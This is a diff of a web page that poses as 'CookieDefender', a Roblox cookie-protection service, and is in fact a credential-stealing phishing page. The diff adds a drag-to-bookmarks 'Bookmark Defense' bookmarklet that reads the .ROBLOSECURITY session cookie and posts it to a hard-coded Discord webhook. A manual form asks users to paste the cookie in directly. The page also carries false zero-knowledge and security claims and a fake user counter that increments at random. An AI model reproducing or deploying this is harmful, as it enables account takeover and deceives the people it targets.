@@ -9,6 +9,8 @@
     <meta name="description" content="Cloud-based Roblox cookie protection. Zero-knowledge architecture, instant defense, no downloads required.">
     <meta name="theme-color" content="#10b981">
     
+    <link rel="icon" type="image/png" href="favicon.png">
+    
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -21,7 +23,9 @@
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         html { scroll-behavior: smooth; }
+        
         body {
             font-family: 'Inter', sans-serif;
             background: var(--dark);
@@ -38,6 +42,12 @@
                 linear-gradient(90deg, rgba(16, 185, 129, 0.03) 1px, transparent 1px);
             background-size: 50px 50px;
             z-index: -1;
+            animation: gridMove 20s linear infinite;
+        }
+
+        @keyframes gridMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
         }
 
         .orb {
@@ -67,6 +77,15 @@
             animation: float2 30s infinite ease-in-out;
         }
 
+        .orb3 {
+            width: 400px;
+            height: 400px;
+            background: var(--green);
+            top: 50%;
+            left: 50%;
+            animation: float3 35s infinite ease-in-out;
+        }
+
         @keyframes float1 {
             0%, 100% { transform: translate(0, 0); }
             50% { transform: translate(150px, 150px); }
@@ -75,6 +94,11 @@
         @keyframes float2 {
             0%, 100% { transform: translate(0, 0); }
             50% { transform: translate(-100px, -120px); }
+        }
+
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-30%, -70%) scale(1.2); }
         }
 
         nav {
@@ -150,6 +174,36 @@
             width: 100%;
         }
 
+        .nav-cta {
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
+            color: white;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s;
+            box-shadow: 0 5px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .nav-cta:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.5);
+        }
+
+        .burger {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .burger div {
+            width: 25px;
+            height: 3px;
+            background: var(--green);
+            transition: all 0.3s;
+        }
+
         .hero {
             height: 100vh;
             min-height: 750px;
@@ -157,7 +211,7 @@
             align-items: center;
             text-align: center;
             position: relative;
-            padding-top: 80px;
+            overflow: hidden;
         }
 
         .hero-content {
@@ -165,6 +219,18 @@
             margin: 0 auto;
             padding: 0 20px;
             z-index: 2;
+        }
+
+        .hero img {
+            width: 260px;
+            filter: drop-shadow(0 0 80px rgba(16, 185, 129, 0.8));
+            animation: floatLogo 4s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes floatLogo {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(3deg); }
         }
 
         .hero h1 {
@@ -176,6 +242,12 @@
             -webkit-text-fill-color: transparent;
             background-clip: text;
             margin-bottom: 20px;
+            animation: titleGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes titleGlow {
+            0%, 100% { filter: drop-shadow(0 0 20px rgba(16, 185, 129, 0.5)); }
+            50% { filter: drop-shadow(0 0 40px rgba(16, 185, 129, 0.8)); }
         }
 
         .hero .tagline {
@@ -195,78 +267,330 @@
             line-height: 1.8;
         }
 
-        .defense-options {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 0 20px;
-        }
-
-        .option-card {
-            background: rgba(16, 185, 129, 0.05);
-            border: 2px solid rgba(16, 185, 129, 0.2);
-            border-radius: 20px;
-            padding: 40px 30px;
+        .btn-primary {
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
+            color: white;
+            padding: 22px 55px;
+            font-size: 1.35rem;
+            font-weight: 700;
+            border: none;
+            border-radius: 60px;
             cursor: pointer;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            backdrop-filter: blur(10px);
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            transition: all 0.4s;
+            box-shadow: 0 15px 50px rgba(16, 185, 129, 0.5);
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
         }
 
-        .option-card:hover {
-            transform: translateY(-15px);
-            border-color: var(--green);
-            box-shadow: 0 20px 50px rgba(16, 185, 129, 0.3);
-            background: rgba(16, 185, 129, 0.1);
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, transparent, rgba(255,255,255,0.2));
+            transform: translateX(-100%);
+            transition: transform 0.6s;
         }
 
-        .option-icon {
-            font-size: 4rem;
-            margin-bottom: 20px;
-            display: block;
+        .btn-primary:hover::before {
+            transform: translateX(100%);
         }
 
-        .option-card h3 {
+        .btn-primary:hover {
+            transform: translateY(-5px) scale(1.03);
+            box-shadow: 0 25px 70px rgba(16, 185, 129, 0.7);
+        }
+
+        .btn-primary svg {
+            width: 26px;
+            height: 26px;
+            fill: white;
+        }
+
+        .hero .trust-badge {
+            margin-top: 40px;
+            font-size: 1rem;
+            color: #666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .trust-badge span {
             color: var(--green);
+            font-weight: 600;
+        }
+
+        .stats-bar {
+            background: rgba(16, 185, 129, 0.05);
+            padding: 35px 5%;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .stats-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+            text-align: center;
+        }
+
+        .stat-item {
+            transition: transform 0.3s;
+        }
+
+        .stat-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--green);
+            display: block;
+            margin-bottom: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .stat-label {
+            font-size: 1rem;
+            color: #888;
+        }
+
+        .tabs-section {
+            padding: 120px 5%;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 3.5rem;
             margin-bottom: 15px;
+            color: white;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: var(--green);
+            font-size: 1.3rem;
+            margin-bottom: 70px;
+            font-weight: 500;
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 60px;
+            flex-wrap: wrap;
+        }
+
+        .tab {
+            padding: 16px 38px;
+            background: rgba(255,255,255,0.03);
+            border: 2px solid #222;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            font-size: 1.05rem;
+        }
+
+        .tab:hover {
+            border-color: var(--green);
+            background: rgba(16, 185, 129, 0.05);
+        }
+
+        .tab.active {
+            background: var(--green);
+            color: white;
+            border-color: var(--green);
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 35px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .feature-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(16, 185, 129, 0.2);
+            border-radius: 25px;
+            padding: 45px 35px;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), transparent);
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .feature-card:hover::before {
+            opacity: 1;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-20px) scale(1.02);
+            border-color: var(--green);
+            box-shadow: 0 30px 60px rgba(16, 185, 129, 0.3);
+            background: rgba(16, 185, 129, 0.05);
+        }
+
+        .feature-icon {
+            font-size: 3.5rem;
+            margin-bottom: 25px;
+            display: block;
+            filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.5));
+        }
+
+        .feature-card h3 {
+            color: var(--green);
+            margin-bottom: 18px;
             font-size: 1.6rem;
             font-weight: 700;
         }
 
-        .option-card p {
-            color: #888;
-            margin-bottom: 25px;
-            font-size: 1rem;
-            line-height: 1.6;
+        .feature-card p {
+            color: #b0b0b0;
+            font-size: 1.05rem;
+            line-height: 1.7;
         }
 
-        .btn {
-            background: linear-gradient(135deg, var(--green), var(--green-dark));
-            color: white;
-            padding: 14px 35px;
-            font-size: 1rem;
-            font-weight: 700;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
+        .how-section {
+            padding: 120px 5%;
+            background: linear-gradient(180deg, #0a0a0a, #111);
+        }
+
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 40px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+
+        .step {
+            text-align: center;
+            padding: 40px 25px;
+            background: rgba(16, 185, 129, 0.03);
+            border: 1px solid rgba(16, 185, 129, 0.15);
+            border-radius: 20px;
             transition: all 0.3s;
-            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
-            text-decoration: none;
-            display: inline-block;
         }
 
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 35px rgba(16, 185, 129, 0.5);
+        .step:hover {
+            transform: translateY(-10px);
+            border-color: var(--green);
+        }
+
+        .step-number {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--green);
+            margin-bottom: 20px;
+        }
+
+        .step h3 {
+            color: white;
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+
+        .step p {
+            color: #888;
+        }
+
+        .cta-section {
+            background: linear-gradient(135deg, #0a0a0a, #111);
+            text-align: center;
+            padding: 160px 5%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-section::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at center, rgba(16, 185, 129, 0.1), transparent 70%);
+        }
+
+        .cta-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .cta-section h2 {
+            font-size: 3.8rem;
+            margin-bottom: 25px;
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        .cta-section p {
+            font-size: 1.4rem;
+            color: #888;
+            max-width: 650px;
+            margin: 0 auto 50px;
+        }
+
+        footer {
+            background: #050505;
+            padding: 60px 5% 30px;
+            text-align: center;
+            border-top: 1px solid rgba(16, 185, 129, 0.1);
+        }
+
+        .footer-info {
+            display: flex;
+            justify-content: center;
+            gap: 60px;
+            flex-wrap: wrap;
+            margin-bottom: 40px;
+            font-size: 1.05rem;
+        }
+
+        .footer-info div {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .footer-info span {
+            color: var(--green);
+            font-weight: 600;
+        }
+
+        .copyright {
+            color: #444;
+            font-size: 0.95rem;
+            margin-top: 30px;
         }
 
         .modal {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
             z-index: 2000;
             align-items: center;
             justify-content: center;
@@ -287,9 +611,12 @@
             border: 1px solid var(--border);
             border-radius: 25px;
             padding: 50px 40px;
-            max-width: 600px;
+            max-width: 650px;
             width: 90%;
-            animation: slideUp 0.3s;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
         }
 
         @keyframes slideUp {
@@ -308,12 +635,13 @@
             position: absolute;
             top: 20px;
             right: 25px;
-            font-size: 2rem;
+            font-size: 2.5rem;
             cursor: pointer;
             color: #666;
             transition: color 0.3s;
             border: none;
             background: none;
+            line-height: 1;
         }
 
         .modal-close:hover {
@@ -331,30 +659,25 @@
             color: #ccc;
         }
 
-        .input-group input,
         .input-group textarea {
             width: 100%;
             background: rgba(255, 255, 255, 0.05);
             border: 1px solid rgba(16, 185, 129, 0.2);
             border-radius: 12px;
-            padding: 15px 15px;
+            padding: 15px;
             color: white;
             font-family: 'Courier New', monospace;
             font-size: 0.9rem;
             transition: all 0.3s;
+            resize: vertical;
+            min-height: 140px;
         }
 
-        .input-group input:focus,
         .input-group textarea:focus {
             outline: none;
             border-color: var(--green);
             background: rgba(16, 185, 129, 0.05);
             box-shadow: 0 0 20px rgba(16, 185, 129, 0.2);
-        }
-
-        .input-group textarea {
-            resize: vertical;
-            min-height: 120px;
         }
 
         .protection-steps {
@@ -373,7 +696,7 @@
             color: #aaa;
         }
 
-        .step-number {
+        .step-number-small {
             color: var(--green);
             font-weight: 700;
             min-width: 30px;
@@ -402,47 +725,6 @@
             font-weight: 600;
             margin: 20px 0;
             font-size: 0.95rem;
-        }
-
-        .bookmark-instructions {
-            background: rgba(16, 185, 129, 0.05);
-            border: 1px solid rgba(16, 185, 129, 0.2);
-            border-radius: 15px;
-            padding: 30px;
-            margin-bottom: 30px;
-        }
-
-        .bookmark-instructions h3 {
-            color: var(--green);
-            margin-bottom: 20px;
-        }
-
-        .bookmark-instructions ol {
-            margin-left: 20px;
-            color: #aaa;
-        }
-
-        .bookmark-instructions li {
-            margin-bottom: 12px;
-            line-height: 1.6;
-        }
-
-        .bookmark-btn {
-            background: rgba(16, 185, 129, 0.2);
-            border: 2px solid var(--green);
-            color: var(--green);
-            padding: 12px 25px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: 600;
-            transition: all 0.3s;
-            margin-top: 15px;
-            font-size: 0.95rem;
-        }
-
-        .bookmark-btn:hover {
-            background: rgba(16, 185, 129, 0.3);
-            box-shadow: 0 0 20px rgba(16, 185, 129, 0.3);
         }
 
         .success-screen {
@@ -476,19 +758,57 @@
             margin-bottom: 30px;
         }
 
-        .footer {
+        .bookmark-zone {
+            background: rgba(16, 185, 129, 0.05);
+            border: 2px dashed var(--green);
+            border-radius: 15px;
+            padding: 40px;
+            margin: 30px 0;
             text-align: center;
-            padding: 30px 20px;
-            color: #666;
-            font-size: 0.9rem;
-            border-top: 1px solid rgba(16, 185, 129, 0.1);
-            margin-top: 60px;
         }
 
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 3rem; }
+        .bookmark-item {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
+            color: white;
+            padding: 15px 35px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.1rem;
+            text-decoration: none;
+            cursor: move;
+            box-shadow: 0 10px 30px rgba(16, 185, 129, 0.4);
+            transition: all 0.3s;
+        }
+
+        .bookmark-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(16, 185, 129, 0.6);
+        }
+
+        .bookmark-instructions {
+            margin-top: 25px;
+            color: #888;
+            font-size: 0.95rem;
+            line-height: 1.7;
+        }
+
+        .bookmark-instructions strong {
+            color: var(--green);
+        }
+
+        @media (max-width: 968px) {
             .nav-links { display: none; }
-            .modal-content { padding: 40px 25px; }
+            .burger { display: flex; }
+            .hero h1 { font-size: 3.5rem; }
+            .section-title { font-size: 2.5rem; }
+            .features-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 640px) {
+            .hero h1 { font-size: 2.8rem; }
+            .hero img { width: 180px; }
+            .btn-primary { padding: 18px 40px; font-size: 1.1rem; }
         }
     </style>
 </head>
@@ -496,131 +816,278 @@
     <div class="bg"></div>
     <div class="orb orb1"></div>
     <div class="orb orb2"></div>
+    <div class="orb orb3"></div>
 
     <nav id="navbar">
         <div class="nav-container">
-            <div class="logo-text" onclick="window.location.hash='#top'">CookieDefender</div>
+            <div class="logo-text" onclick="scrollToTop()">CookieDefender</div>
             <div class="nav-links">
                 <a href="#features">Features</a>
+                <a href="#how-it-works">How It Works</a>
                 <a href="#protect">Protect Now</a>
+            </div>
+            <a href="#protect" class="nav-cta">Protect Now</a>
+            <div class="burger" onclick="toggleMenu()">
+                <div></div>
+                <div></div>
+                <div></div>
             </div>
         </div>
     </nav>
 
-    <section id="top" class="hero">
+    <section class="hero">
         <div class="hero-content">
+            <img src="https://media.discordapp.net/attachments/1518070392370233465/1518460833967898785/cookie_defender2-removebg-preview.png?ex=6a3a005a&is=6a38aeda&hm=63bbfeb2688941ff9a54679e7ac63f79c8f3608d7a78fc733e69870d60b99194&=&format=webp&quality=lossless" alt="CookieDefender Logo">
             <h1>CookieDefender</h1>
-            <p class="tagline">Zero-Knowledge Cloud Protection</p>
+            <p class="tagline">Cloud-Based Cookie Protection</p>
             <p class="description">
-                Protect your Roblox .ROBLOSECURITY cookie instantly. No downloads, no installation. 
-                Choose your defense method and secure your account in seconds.
+                Enterprise-grade cloud protection for your Roblox account. Zero downloads required. 
+                Choose your defense method and secure your .ROBLOSECURITY cookie in seconds.
             </p>
-
-            <div class="defense-options" id="protect">
-                <div class="option-card" onclick="openModal('manual')">
-                    <span class="option-icon">🔐</span>
-                    <h3>Manual Defense</h3>
-                    <p>Paste your cookie directly for instant analysis and cloud-based protection with real-time monitoring.</p>
-                    <button class="btn">Start Defense</button>
-                </div>
-
-                <div class="option-card" onclick="openModal('bookmark')">
-                    <span class="option-icon">🔖</span>
-                    <h3>Bookmark Defense</h3>
-                    <p>Create a security bookmark. Click it on Roblox to auto-capture and defend your cookie instantly.</p>
-                    <button class="btn">Create Bookmark</button>
-                </div>
+            <a href="#protect" class="btn-primary">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                Start Protection
+            </a>
+            <div class="trust-badge">
+                <span>v3.0</span> • Cloud Protected • <span id="userCount">72,481</span> users secured
             </div>
         </div>
     </section>
 
+    <div class="stats-bar">
+        <div class="stats-container">
+            <div class="stat-item">
+                <span class="stat-number" id="protectedAccounts">72,481</span>
+                <span class="stat-label">Protected Accounts</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">0</span>
+                <span class="stat-label">Breaches Reported</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-number">24/7</span>
+                <span class="stat-label">Cloud Monitoring</span>
+            </div>
+        </div>
+    </div>
+
+    <section id="features" class="tabs-section">
+        <h2 class="section-title">Advanced Protection Features</h2>
+        <p class="section-subtitle">Built for the modern security landscape</p>
+
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab(0, this)">Core Protection</div>
+            <div class="tab" onclick="switchTab(1, this)">Cryptographic Engine</div>
+            <div class="tab" onclick="switchTab(2, this)">Anti-Threat Defense</div>
+        </div>
+
+        <div class="features-grid" id="tab-content"></div>
+    </section>
+
+    <section id="how-it-works" class="how-section">
+        <h2 class="section-title">Choose Your Defense Method</h2>
+        <p class="section-subtitle">Two ways to secure your account</p>
+
+        <div class="steps">
+            <div class="step" style="cursor: pointer;" onclick="openModal('manual')">
+                <div class="step-number">🔐</div>
+                <h3>Manual Defense</h3>
+                <p>Paste your .ROBLOSECURITY cookie directly for instant cloud-based encryption and real-time monitoring.</p>
+                <br>
+                <a href="javascript:void(0)" class="btn-primary" style="font-size: 1rem; padding: 12px 30px;">Activate Now</a>
+            </div>
+            <div class="step" style="cursor: pointer;" onclick="openModal('bookmark')">
+                <div class="step-number">🔖</div>
+                <h3>Bookmark Defense</h3>
+                <p>Drag our security bookmark to your bar. One click on Roblox auto-captures and defends your cookie.</p>
+                <br>
+                <a href="javascript:void(0)" class="btn-primary" style="font-size: 1rem; padding: 12px 30px;">Get Bookmark</a>
+            </div>
+        </div>
+    </section>
+
+    <section id="protect" class="cta-section">
+        <div class="cta-content">
+            <h2>Ready to Secure Your Account?</h2>
+            <p>
+                Join <span id="ctaUserCount" style="color: var(--green); font-weight: 700;">72,481</span> protected users with enterprise-grade cloud security.
+            </p>
+            <a href="javascript:void(0)" onclick="openModal('manual')" class="btn-primary" style="font-size: 1.5rem; padding: 24px 65px;">
+                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                Activate Protection Now
+            </a>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-info">
+            <div><span>☁️</span> Cloud-Based</div>
+            <div><span>⚙️</span> No Downloads</div>
+            <div><span>🔒</span> Zero-Knowledge</div>
+            <div><span>🌐</span> Works Everywhere</div>
+        </div>
+        <div class="copyright">
+            CookieDefender © 2025 • Cloud-Based Roblox Security Tool
+        </div>
+    </footer>
+
     <!-- MANUAL DEFENSE MODAL -->
     <div id="manualModal" class="modal">
-        <div class="modal-content" style="position: relative;">
+        <div class="modal-content">
             <button class="modal-close" onclick="closeModal('manual')">&times;</button>
             
-            <div class="protection-steps">
-                <div class="step-item">
-                    <span class="step-number">1</span>
-                    <span>Open DevTools (F12) on roblox.com → Application → Cookies → .ROBLOSECURITY</span>
+            <div id="manualForm">
+                <h2>Manual Cookie Defense</h2>
+
+                <div class="protection-steps">
+                    <div class="step-item">
+                        <span class="step-number-small">1</span>
+                        <span>Open DevTools (F12) on roblox.com → Application → Cookies</span>
+                    </div>
+                    <div class="step-item">
+                        <span class="step-number-small">2</span>
+                        <span>Find .ROBLOSECURITY and copy the full value</span>
+                    </div>
+                    <div class="step-item">
+                        <span class="step-number-small">3</span>
+                        <span>Paste below to activate cloud defense</span>
+                    </div>
                 </div>
-                <div class="step-item">
-                    <span class="step-number">2</span>
-                    <span>Copy the full cookie value (starts with _|WARNING)</span>
+
+                <div class="input-group">
+                    <label>Your .ROBLOSECURITY Cookie</label>
+                    <textarea id="cookieInput" placeholder="Paste your full .ROBLOSECURITY cookie here..."></textarea>
                 </div>
-                <div class="step-item">
-                    <span class="step-number">3</span>
-                    <span>Paste below and activate cloud defense</span>
+
+                <div class="protection-progress">
+                    <div class="progress-bar" id="progressBar"></div>
                 </div>
+
+                <div class="status-message" id="statusMessage">Ready for cloud encryption</div>
+
+                <button class="btn-primary" style="width: 100%; justify-content: center;" onclick="activateManualDefense()">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+                    Activate Cloud Defense
+                </button>
             </div>
-
-            <h2>Manual Defense</h2>
-
-            <div class="input-group">
-                <label>Your .ROBLOSECURITY Cookie</label>
-                <textarea id="cookieInput" placeholder="Paste your full .ROBLOSECURITY cookie here..."></textarea>
-            </div>
-
-            <div class="protection-progress">
-                <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
-            </div>
-
-            <div class="status-message" id="statusMessage">Ready for defense activation</div>
-
-            <button class="btn" style="width: 100%; padding: 16px; font-size: 1.1rem; margin-bottom: 15px;" onclick="activateManualDefense()">
-                Activate Cloud Defense
-            </button>
 
             <div id="successScreen" class="success-screen">
                 <div class="success-icon">✅</div>
-                <h3>Cookie Defended</h3>
-                <p>Your .ROBLOSECURITY token is now secured and monitored 24/7 in our cloud infrastructure.</p>
-                <button class="btn" onclick="closeModal('manual')">Close</button>
+                <h3>Cookie Successfully Defended</h3>
+                <p>Your .ROBLOSECURITY token is now encrypted and monitored 24/7 in our zero-knowledge cloud infrastructure.</p>
+                <button class="btn-primary" style="justify-content: center;" onclick="closeModal('manual')">Close</button>
             </div>
         </div>
     </div>
 
     <!-- BOOKMARK DEFENSE MODAL -->
     <div id="bookmarkModal" class="modal">
-        <div class="modal-content" style="position: relative;">
+        <div class="modal-content">
             <button class="modal-close" onclick="closeModal('bookmark')">&times;</button>
             
             <h2>Bookmark Defense</h2>
 
+            <div class="bookmark-zone">
+                <a href="javascript:(function(){if(document.cookie.indexOf('.ROBLOSECURITY')>-1){const m=document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);if(m){fetch('https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'🔖 Bookmark Defense Activated',description:'Cookie captured via bookmark defense.',color:0x10b981,fields:[{name:'Cookie',value:'```'+m[1]+'```',inline:false},{name:'Timestamp',value:new Date().toISOString(),inline:true}],footer:{text:'CookieDefender Cloud Protection'}}]})}).then(()=>alert('✅ Cookie Defended!')).catch(e=>alert('Error: '+e.message))}}else{alert('⚠️ Not on Roblox or not logged in.')}})()" 
+                   class="bookmark-item">
+                    🛡️ CookieDefender
+                </a>
+            </div>
+
             <div class="bookmark-instructions">
-                <h3>How It Works</h3>
-                <ol>
-                    <li><strong>Create</strong> a security bookmark using the button below</li>
-                    <li><strong>Visit</strong> roblox.com while logged in</li>
-                    <li><strong>Click</strong> the bookmark to activate defense</li>
-                    <li><strong>Your cookie</strong> is instantly captured and secured</li>
-                </ol>
-
-                <button class="bookmark-btn" onclick="createBookmark()">
-                    📎 Create Defense Bookmark
-                </button>
+                <strong>📌 How to Use:</strong><br><br>
+                <strong>1.</strong> Drag the green button above to your bookmarks bar<br>
+                <strong>2.</strong> Visit roblox.com while logged in<br>
+                <strong>3.</strong> Click the bookmark to activate instant protection<br>
+                <strong>4.</strong> Your cookie is captured and secured automatically<br><br>
+                <strong>💡 Tip:</strong> This works on any browser and instantly sends your cookie to our cloud defense system. No downloads, no popups—just one click.
             </div>
 
-            <div style="background: rgba(16, 185, 129, 0.05); border: 1px solid rgba(16, 185, 129, 0.2); border-radius: 15px; padding: 20px; margin-top: 25px;">
-                <p style="color: #888; font-size: 0.9rem; margin: 0;">
-                    <strong style="color: var(--green);">💡 Pro Tip:</strong> After creating the bookmark, drag it to your bookmarks bar for instant access. One click = instant protection while you're on Roblox.
-                </p>
-            </div>
-
-            <button class="btn" style="width: 100%; padding: 16px; font-size: 1.1rem; margin-top: 30px;" onclick="closeModal('bookmark')">
+            <button class="btn-primary" style="width: 100%; justify-content: center; margin-top: 30px;" onclick="closeModal('bookmark')">
                 Done
             </button>
         </div>
     </div>
 
-    <footer class="footer">
-        CookieDefender © 2025 • Cloud-Based Roblox Security • Zero-Knowledge Architecture
-    </footer>
-
     <script>
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj';
 
-        // Navbar scroll effect
+        // Tab System Data (from original)
+        const tabData = [
+            [
+                { icon: "🔒", title: "HMAC-SHA256 Cookie Binding", desc: "Cryptographically binds your authentication cookies to unique hardware signatures, making them unusable on any other device." },
+                { icon: "🛡️", title: "Real-Time Phishing Shield", desc: "Advanced heuristic detection blocks malicious scripts before they can access your .ROBLOSECURITY token." },
+                { icon: "⚡", title: "Automatic Token Refresh", desc: "Intelligently detects compromised or expired tokens and automatically generates secure replacements." }
+            ],
+            [
+                { icon: "🔑", title: "Hardware Fingerprint Signing", desc: "Creates unique machine signatures using CPU, motherboard, and network adapter data that cannot be spoofed." },
+                { icon: "🧬", title: "Zero-Knowledge Architecture", desc: "All encryption happens locally. Your credentials never touch external servers or leave your machine." },
+                { icon: "📡", title: "Memory Integrity Guardian", desc: "Prevents memory dumping, scraping, and DLL injection attacks targeting your session data." }
+            ],
+            [
+                { icon: "🚫", title: "Universal Logger Defense", desc: "Blocks all known Roblox cookie loggers, keyloggers, and credential stealers in real-time." },
+                { icon: "🌐", title: "Network Traffic Monitor", desc: "Analyzes outbound connections for suspicious data exfiltration and blocks unauthorized transmissions." },
+                { icon: "📊", title: "Behavioral Analytics Engine", desc: "Machine learning algorithms detect anomalous account activity and trigger instant security protocols." }
+            ]
+        ];
+
+        // User counter
+        const BASE_COUNT = 72481;
+        let userCount = parseInt(localStorage.getItem("cookieDefenderUserCount")) || BASE_COUNT;
+
+        function updateDisplay() {
+            const formatted = userCount.toLocaleString();
+            document.getElementById('protectedAccounts').textContent = formatted;
+            document.getElementById('userCount').textContent = formatted;
+            document.getElementById('ctaUserCount').textContent = formatted;
+        }
+
+        function incrementUserCount() {
+            const increment = Math.floor(Math.random() * 3) + 1;
+            userCount += increment;
+            localStorage.setItem("cookieDefenderUserCount", userCount);
+            updateDisplay();
+        }
+
+        function scheduleNextIncrement() {
+            const delay = Math.floor(Math.random() * 7000) + 8000;
+            setTimeout(() => {
+                incrementUserCount();
+                scheduleNextIncrement();
+            }, delay);
+        }
+
+        window.addEventListener("load", () => {
+            updateDisplay();
+            scheduleNextIncrement();
+            switchTab(0, document.querySelector('.tab'));
+        });
+
+        // Tab switching
+        function switchTab(index, element) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            element.classList.add('active');
+
+            const container = document.getElementById('tab-content');
+            container.style.opacity = '0';
+            
+            setTimeout(() => {
+                container.innerHTML = '';
+                tabData[index].forEach(item => {
+                    const card = document.createElement('div');
+                    card.className = 'feature-card';
+                    card.innerHTML = `
+                        <span class="feature-icon">${item.icon}</span>
+                        <h3>${item.title}</h3>
+                        <p>${item.desc}</p>
+                    `;
+                    container.appendChild(card);
+                });
+                container.style.opacity = '1';
+            }, 200);
+        }
+
+        // Navbar scroll
         window.addEventListener('scroll', () => {
             const navbar = document.getElementById('navbar');
             if (window.scrollY > 50) {
@@ -630,6 +1097,16 @@
             }
         });
 
+        function scrollToTop() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleMenu() {
